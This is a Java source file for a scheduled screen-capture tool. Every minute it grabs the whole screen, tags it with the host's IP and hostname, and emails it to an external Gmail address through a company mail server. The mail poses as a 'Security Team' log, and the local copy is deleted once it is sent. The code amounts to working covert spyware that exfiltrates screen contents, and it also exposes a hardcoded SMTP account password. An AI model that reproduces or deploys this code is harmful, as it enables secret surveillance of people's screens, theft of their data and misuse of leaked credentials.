package tools;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.nio.file.Files;
import java.nio.file.Path;

import javax.imageio.ImageIO;

import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;
import org.joda.time.DateTime;
import org.quartz.Job;
import org.quartz.JobBuilder;
import org.quartz.JobDetail;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.Scheduler;
import org.quartz.SchedulerException;
import org.quartz.SimpleScheduleBuilder;
import org.quartz.Trigger;
import org.quartz.TriggerBuilder;
import org.quartz.impl.StdSchedulerFactory;



public class ScreenTaker implements Job{
	
	private String IP;
	private String HostName;
	private Robot robot;
	private Config conf;
	private File output;
	private String date;

	
	private void setNetworkData() throws UnknownHostException{
		IP = Inet4Address.getLocalHost().getHostAddress();
		System.out.println(IP);
		HostName = Inet4Address.getLocalHost().getHostName();
		System.out.println(HostName);
	}
	
	
	private void defaultConfig() {
		// TODO Auto-generated method stub
		conf = new Config();
		conf.setInterval(60);
		EmailConfig emailconfig = new EmailConfig();
		emailconfig.setDomain("smtp.sunset.com.mx");
		emailconfig.setEmail_usr("eosorio@sunset.com.mx");
		emailconfig.setEmail_pwd("Sys73xrv21");
		emailconfig.setEmail_to_send("orkwizard@gmail.com");
		emailconfig.setPort(587);
		conf.setEmail_config(emailconfig);
		System.out.println("Default Config ->" + conf.toString());
	}
	
	public ScreenTaker(){
		try {
			setNetworkData();
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
			defaultConfig();
		try {
			robot = new Robot();
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	
	public ScreenTaker(Config con){
		try {
			setNetworkData();
			if(con==null){
				defaultConfig();
				robot = new Robot();
			}
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public BufferedImage capture(){
		System.out.println("Capturing Image......");
		BufferedImage img = robot.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
		System.out.println("Captured Image.......");
		return img;
	}

	public String getIP() {
		return IP;
	}

	public void setIP(String iP) {
		IP = iP;
	}

	public String getHostName() {
		return HostName;
	}

	public void setHostName(String hostName) {
		HostName = hostName;
	}
	
	
	 public static void main(String[] args){
		 try {
			Scheduler scheduler = StdSchedulerFactory.getDefaultScheduler();	
			scheduler.start();
			System.out.println("New Job");
			JobDetail job = JobBuilder.newJob(ScreenTaker.class).build();
			Trigger trigger = TriggerBuilder.newTrigger().withIdentity("trigger","group1")
					.withSchedule(SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(60).repeatForever())
					.build();
			scheduler.scheduleJob(job,trigger);
			//scheduler.shutdown();

		} catch (SchedulerException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	 }

	@Override
	public void execute(JobExecutionContext arg0) throws JobExecutionException {
		// TODO Auto-generated method stub
		date = DateTime.now().toString();
		System.out.println("Creating snapshot");
		createScreenshot();
		buildEmail();
		
	}

	private void createScreenshot() {
		try {
			Path tempFile = Files.createTempFile(getIP(),".jpg");
			output = tempFile.toFile();
			ImageIO.write(capture(),"jpg", output);
			System.out.println("FileName :-> " + output.getName());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			System.out.println(e.getMessage());
		}

	}

	
	public File getOutput() {
		return output;
	}

	public void setOutput(File output) {
		this.output = output;
	}

	public String getDate() {
		return date;
	}

	public void setDate(String date) {
		this.date = date;
	}

	private void buildEmail() {
		// TODO Auto-generated method stub
		System.out.println("Sending Email.......");
		MultiPartEmail email = new MultiPartEmail();
		email.setHostName(conf.getEmail_config().getDomain()); //smtp.sunset.com.mx
		email.setSmtpPort(conf.getEmail_config().getPort()); //587
		email.setAuthentication(conf.getEmail_config().getEmail_usr(),conf.getEmail_config().getEmail_pwd()); //"eosorio@sunset.com.mx","Sys73xrv21"
		try {
			email.addTo(conf.getEmail_config().getEmail_to_send());
			email.setFrom("security@sunset.com.mx","Security Team");
			email.setSubject("Security File");
			email.setMsg("Security log from : ->>>>"+ getIP()+" --> "+ date);
			email.attach(output);
			email.send();
			System.out.println("Email Sent");
			output.delete();
			System.out.println("Deleted File");
		} catch (EmailException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}


	
}
